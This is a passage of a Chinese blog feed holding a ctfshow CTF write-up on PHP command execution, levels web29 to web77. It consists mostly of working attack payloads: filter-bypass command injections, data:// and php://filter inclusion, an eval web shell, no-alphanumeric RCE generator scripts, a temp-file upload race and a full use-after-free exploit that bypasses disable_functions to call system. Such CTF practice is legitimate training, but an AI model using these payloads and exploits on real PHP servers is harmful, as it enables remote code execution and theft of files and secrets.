//内联执行，就是将反引号内命令的输出作为输入执行cp fla&#123;g.php,G&#125;    //把flag.php复制为flaG6.c=`c&#39;a&#39;t /flag` //绕过字符串的过滤</code></pre><p>可以读取文件的函数：</p><pre><code>readfile()读取文件 highlight_file()读文件 show_source()同上 base64_decode()base64解码 strrev()反转字符串include()文件包含，可以不使用括号require()完全可以替代include()</code></pre><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>payload ?c=echo `cat f*`;</code></pre><p>其他可代替system函数：</p><pre><code>system()passthru() exec() shell_exec() popen() proc_open()pcntl_exec() 反引号 同shell_exec()</code></pre><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>payload c=echo%09`tac%09f*`;</code></pre><p>文件读取命令</p><pre><code>sort:文件排序并输出也可以查看内容more:一页一页的显示档案内容less:与 more 类似 head:查看头几行tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示tail:查看尾几行nl:显示内容，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看uniq:可以查看 file -f:报错出具体内容grepgrep &#123; flag.php打印有”&#123;“的一行strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings。通常用法：strings\$IFS\$9f*(必须加转义字符)paste把每个文件以列对列的方式，一列列地加以合并sed一种编辑器，可以用sed -f flag.php读取flagawkcurlcut</code></pre><p>linux绕过空格</p><pre><code>cat%09flag  //tab&#123;cat,flag.txt&#125; cat$&#123;IFS&#125;$9flag.txt  //$IFS在linux下表示为空格cat&#123;IFS&#125;flag.txtcat$IFSflag.txtcat$&#123;IFS&#125;flag.txtcat$IFS$1flag.txt //$1改成$加其他数字都行catIFSflag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt ca\t fl\ag</code></pre><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;         2.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php        3.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>include可以不用括号,分号用?&gt;代替</p><h3 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h3><p>这四关都可以前面的payload，36关只需把1换成a就行了</p><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php        2.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>php总比较常用的可以不加括号的函数有:</p><pre><code>`echo`、`print`、`isset`、`unset`、`include`、`require`</code></pre><h2 id="类型二-变量c接收并过滤传入的数据-include来包含文件"><a href="#类型二-变量c接收并过滤传入的数据-include来包含文件" class="headerlink" title="类型二:变量c接收并过滤传入的数据,include来包含文件"></a>类型二:变量c接收并过滤传入的数据,include来包含文件</h2><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>这关要用到php伪协议data:&#x2F;&#x2F;</p><pre><code>payload ?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);?&gt;        ?c=data:,&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;  //可以直接用蚁剑连接</code></pre><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>过滤了php和file，可以用&lt;?&#x3D;或进行base64编码</p><pre><code>payload c=data://text/plain,&lt;?=system(&quot;cat f*&quot;);?&gt;        c=data:text/base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhKiIpOw==</code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>payload c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;</code></pre><p>.php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p><h3 id="web40-属于类型一"><a href="#web40-属于类型一" class="headerlink" title="web40  属于类型一"></a>web40  属于类型一</h3><p>此题考察无参数函数构造，参考大佬们写的：</p><p>函数：print_r(scandir(‘.’))可以用来查看当前目录所有文件名，我们要做的是将括号中的.替换掉</p><p>localeconv()函数返回一包含本地数字及货币格式信息的数组，如下只是该函数的一部分数组元素</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/44337.png" class=""><p>可利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数 .<br>那么如何将数组中的第一个元素读取出来呢？可以使用以下函数：</p><pre><code>current()函数返回数组中的当前元素/单元，默认取第一个值； pos()函数同上，是current()函数的别名； reset()函数，当数组不为空时返回数组第一个单元的值，如果数组为空则返回FALSE</code></pre><p>可以得到flag.php位于数组的第三个值里，也就是倒数第二个，我们可以通过array_reverse()函数以相反的元素顺序返回数组，在用next()函数读取下一个元素，最后通过highlight_file()函数读取到flag.php</p><pre><code>payload ①?c=print_r(scandir(pos(localeconv())));        ②?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p>更多操作参考<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h3 id="web41-属于类型一"><a href="#web41-属于类型一" class="headerlink" title="web41 属于类型一"></a>web41 属于类型一</h3><p>这关是无字母数字命令执行</p><p>p神原话：在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>以下参考<a href="https://blog.csdn.net/Sapphire037/article/details/121054836">https://blog.csdn.net/Sapphire037/article/details/121054836</a></p><p>通过代码审计我们可以知道这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，但是留了一个<code>|</code>也就是或运算还可以用，这个时候利用Y4师傅和羽师傅的脚本结合，即可很方便的做出来这题。先看Y4师傅的脚本</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*///或function orRce($par1, $par2)&#123;    $result = (urldecode($par1)|urldecode($par2));    return $result;&#125;//异或function xorRce($par1, $par2)&#123;    $result = (urldecode($par1)^urldecode($par2));    return $result;&#125;//取反function negateRce()&#123;    fwrite(STDOUT,&#39;[+]your function: &#39;);    $system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));    fwrite(STDOUT,&#39;[+]your command: &#39;);    $command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));    echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;&#125;//mode=1代表或，2代表异或，3代表取反//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式function generate($mode, $preg=&#39;/[0-9]/i&#39;)&#123;    if ($mode!=3)&#123;        $myfile = fopen(&quot;rce.txt&quot;, &quot;w&quot;);        $contents = &quot;&quot;;        for ($i=0;$i&lt;256;$i++)&#123;            for ($j=0;$j&lt;256;$j++)&#123;                if ($i&lt;16)&#123;                    $hex_i = &#39;0&#39;.dechex($i);                &#125;else&#123;                    $hex_i = dechex($i);                &#125;                if ($j&lt;16)&#123;                    $hex_j = &#39;0&#39;.dechex($j);                &#125;else&#123;                    $hex_j = dechex($j);                &#125;                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;                &#125;else&#123;                    $par1 = &quot;%&quot;.$hex_i;                    $par2 = &#39;%&#39;.$hex_j;                    $res = &#39;&#39;;                    if ($mode==1)&#123;                        $res = orRce($par1, $par2);                    &#125;else if ($mode==2)&#123;                        $res = xorRce($par1, $par2);                    &#125;                    if (ord($res)&gt;=32&amp;ord($res)&lt;=126)&#123;                        $contents=$contents.$res.&quot; &quot;.$par1.&quot; &quot;.$par2.&quot;\n&quot;;                    &#125;                &#125;            &#125;        &#125;        fwrite($myfile,$contents);        fclose($myfile);    &#125;else&#123;        negateRce();    &#125;&#125;generate(1,&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;);//1代表模式，后面的是过滤规则</code></pre><p>再利用羽师傅的脚本</p><pre><code class="python"># -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php D:\\phpstudy_pro\\WWW\\rce.php&quot;)  # 没有将php写入环境变量需手动运行if (len(argv) != 2):    print(&quot;=&quot; * 50)    print(&#39;USER：python exp.py &lt;url&gt;&#39;)    print(&quot;eg：  python exp.py http://ctf.show/&quot;)    print(&quot;=&quot; * 50)    exit(0)url = argv[1]def action(arg):    s1 = &quot;&quot;    s2 = &quot;&quot;    for i in arg:        f = open(r&quot;D:\phpstudy_pro\WWW\rce.txt&quot;, &quot;r&quot;)//填txt的文件位置        while True:            t = f.readline()            if t == &quot;&quot;:                break            if t[0] == i:                # print(i)                s1 += t[2:5]                s2 += t[6:9]                break        f.close()    output = &quot;(\&quot;&quot; + s1 + &quot;\&quot;|\&quot;&quot; + s2 + &quot;\&quot;)&quot;    return (output)while True:    param = action(input(&quot;\n[+] your function：&quot;)) + action(input(&quot;[+] your command：&quot;))    data = &#123;        &#39;c&#39;: urllib.parse.unquote(param)    &#125;    r = requests.post(url, data=data)    print(&quot;\n[*] result:\n&quot; + r.text)</code></pre><p>上面就注意下php脚本的位置和生成的rce.txt的位置还有接受的参数比如上面是c，换个参数就把c改了就行</p><p>那么完整流程就是</p><pre><code>1.先改一下php脚本中generate函数里的参数，也就是设置模式和正则2.python rce_.py url</code></pre><p>可以看看p神的博客</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p><h2 id="类型三-接受并过滤传入的变量拼接命令执行（system函数）"><a href="#类型三-接受并过滤传入的变量拼接命令执行（system函数）" class="headerlink" title="类型三:接受并过滤传入的变量拼接命令执行（system函数）"></a>类型三:接受并过滤传入的变量拼接命令执行（system函数）</h2><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 也可以写成“1&gt; &#x2F;dev&#x2F;null 2&gt; &amp;1”,我们写入的命令的执行结果会被黑洞吞掉。</p><p>分隔符变量拼接可以用分隔符来控制后面语句的执行</p><p>分割符</p><pre><code>; 分号顺序执行&amp;&amp; 顺序执行|| 前边执行成功则不再执行换行符(在url中是%0a)&amp; (在url中是%26)</code></pre><p>注意，通过url传递&amp;&amp;时要记得urlencode为%26%26，否则会被当作url参数的分隔符而不是shell命令的分隔符。</p><pre><code>payload c=cat flag.php%26</code></pre><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>过滤了cat，用tac替换</p><pre><code>paylaod c=tac flag.php%26</code></pre><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code>payload c=tac f*%26</code></pre><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>用%09替换空格</p><pre><code>paylaod c=tac%09f*%26</code></pre><p>常见的空格替换</p><pre><code>%09，%20，$IFS、$&#123;IFS&#125;、$IFS$9，&#123;tac,*&#125;，&lt;，&lt;&gt;</code></pre><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>过滤了*和数字</p><pre><code>payload c=tac%09fla&#39;&#39;g.php||        c=tac%09fl[a-z]g.php||</code></pre><p>%09解码后是水平制表符，而不是数字</p><h3 id="web47-49"><a href="#web47-49" class="headerlink" title="web47-49"></a>web47-49</h3><pre><code>payload c=tac%09fla&#39;&#39;g.php||</code></pre><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>屏蔽了x09和x26，也就是屏蔽了%09和%26，用其他方式绕过空格,这关用不了[a-z]了</p><pre><code>payload c=tac&lt;&gt;fl\ag.php||</code></pre><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>tac被ban了</p><pre><code>payload c=ta&#39;&#39;c&lt;&gt;fla\g.php||        c=ta\c&lt;&gt;fla\g.php||        c=nl&lt;&gt;fla\g.php||</code></pre><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>&lt;&gt;尖括号被过滤了但是$没过滤</p><pre><code>?c=ls$&#123;IFS&#125;../../../||   //flag在根目录c=ta\c$&#123;IFS&#125;../../../fl\ag||</code></pre><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>多过滤了wget，没影响</p><pre><code>payload ?c=ta\c$&#123;IFS&#125;fla\g.php</code></pre><p>注意，这一关没有了黑洞</p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>1.可以使用grep命令：</p><pre><code>?c=grep$&#123;IFS&#125;ctf$&#123;IFS&#125;fl?g.php</code></pre><p>2.可以使用mv命令</p><pre><code>?c=mv$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt  //直接访问a.txt</code></pre><ol start="3"><li>&#x2F;bin下存放一些普通的基本命令，可以使用通配符去调用命令</li></ol><pre><code>?c=/bin/?at$&#123;IFS&#125;f???????</code></pre><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p>方法一：通过匹配bin下存在的命令进行读取flag。<br> bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br> 我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是&#x2F;bin&#x2F;ls</p><pre><code>payload ?c=/???/????64 ????.???//也就是?c=/bin/base64 flag.php</code></pre><p>方法二：bzip2的使用</p><pre><code>payload：?c=/???/???/????2 ????.???//也就是/usr/bin/bzip2 flag.php然后访问/flag.php.bz2进行下载获得flag.php</code></pre><p>注:<strong>&#x2F;bin</strong> 是所有用户都可以访问并执行的可执行程序。包括超级用户及一般用户。<br>      <strong>&#x2F;usr&#x2F;bin</strong> 是系统安装时自带的一些可执行程序。即系统程序。</p><p>方法三：</p><p>可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php?????[@-[]（上传的文件在linux下面一般保存在&#x2F;tmp&#x2F;php??????一般后面的6个字符是五个小写加一个大写，大写可以通过linux的匹配符去匹配，不过因为是随机生成的大写字母，不一定每次都是大写，可以多试几下。）<br>注意：通过.去执行sh命令不需要有执行权限<br>需要先构造一个post上传文件的数据包。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>然后抓包并修改文件内容改为shell命令，并且传入c参数：</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/155054.png" class=""><p>可以看看p神的无字母数字提高篇<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>过滤了数字，使用前一关的第三种方法即可</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>这关需要构造出36。</p><p>$(()) 代表做一次运算，因为里面为空，也表示值为0</p><p>$((~$(())))对0作取反运算，值为-1（如果对a按位取反，则得到的结果为-(a+1)）<br>$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2</p><p>写个脚本生成payload:</p><pre><code class="php">data = &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;print(data)</code></pre><h3 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h3><p>禁用了一些函数，直接读取文件</p><p>首先获取文件路径</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/104435.png" class=""><pre><code>c=print_r(scandir(dirname(&#39;./&#39;)));c=var_dump(scandir(&#39;./&#39;));c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;c=$a=&quot;glob:///*&quot;;if($b=opendir($a))&#123;while(($file=readdir($b))!==false)&#123;echo $file.&quot;\n&quot;;&#125;&#125;c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;c=$a=dir(getcwd());while ($file = $a-&gt;read())&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</code></pre><p>php读取文件函数：</p><pre><code>file()把整个文件读入一个数组中readfile()读取文件fpassthru()读取文件highlight_file()读文件show_source()同上base64_decode()base64解码strrev()反转字符串php_strip_whitespace()  返回删除注释和空格后的PHP源码file_get_contents()   将整个文件读入一个字符串include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码示例：echo file_get_contents(&quot;flag.php&quot;);   print_r(file(&#39;flag.php&#39;));var_dump(file(&#39;flag.php&#39;));include(&#39;flag.php&#39;);echo $flag;var_dump(glob(&quot;*flag*&quot;)); // 寻找与模式匹配的文件路径include(&#39;flag.php&#39;);var_dump(get_defined_vars()); //get_defined_vars()函数返回由所有已定义变量所组成的数组。</code></pre><p>通过fopen读取文件内容</p><pre><code>fread()fread($file,100)     读取打开的文件，读取100个字节fgets()读取一行fgetc()读取一个字符fgetss()fgetcsv()读取一行gpassthru()payload:c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;//一行一行读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;//一个一个字符读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</code></pre><p>也可以通过复制，重命名读取php文件内容</p><pre><code>copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);             rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><p>还可以直接用蚁剑连接。</p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>show_source()被ban了，使用highlight_file()，这次的flag在flag.txt里，先查目录，再进文件。</p><pre><code>c=print_r(scandir(&#39;../../../&#39;));c=highlight_file(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>print_r被ban了</p><pre><code>c=var_dump(scandir(&#39;../../../&#39;));c=highlight_file(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>highlight_file()被ban了，但因为flag在txt里，所以可以用include()</p><pre><code>c=var_dump(scandir(&#39;../../../&#39;));c=include(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web69-70"><a href="#web69-70" class="headerlink" title="web69-70"></a>web69-70</h3><p>print_r()和var_dump()都被ban了，用其他方式读目录</p><pre><code>c=$a=opendir(&#39;./&#39;);while(($file=readdir($a))!==false)&#123;echo $file.“&lt;/br&gt;”;&#125;;c=include(&#39;/flag.txt&#39;);</code></pre><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>下载附件</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/212130.png" class=""><pre><code>ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</code></pre><pre><code>payload c=include(&quot;/flag.txt&quot;);exit();</code></pre><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>尝试读取根目录</p><pre><code>c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</code></pre><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/215446.png" class=""><p>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。<br> disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空。<br> ini_set()用于设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。但是这题也给ban了。<br> 那么可以使用glob伪协议绕过open_basedir</p><pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();</code></pre><p>然后可以看到flag文件名为flag0.txt，但是由于open_basedir的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把c&#x3D;之后的内容url编码：</p><pre><code>c=function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                              if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                    if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();#需要通过url编码哦</code></pre><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><p>扫描目录</p><pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();c=$d=opendir(&quot;../../../&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit(); //跟着别的教程走了半天，最后发现这两关没有被open_basedir限制</code></pre><p>直接用include</p><pre><code>c=include(&quot;/flagc.txt&quot;);exit(0);c=require(&quot;/flagc.txt&quot;);exit(0);</code></pre><h3 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h3><p>直接include()不行了，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag</p><pre><code>c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></pre><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>看大佬说是要用到使用PHP7.4以上才有的FFI进行命令执行</p><pre><code>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的$ffi-&gt;system($a);//通过$ffi去调用system函数</code></pre><p>参考：<a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
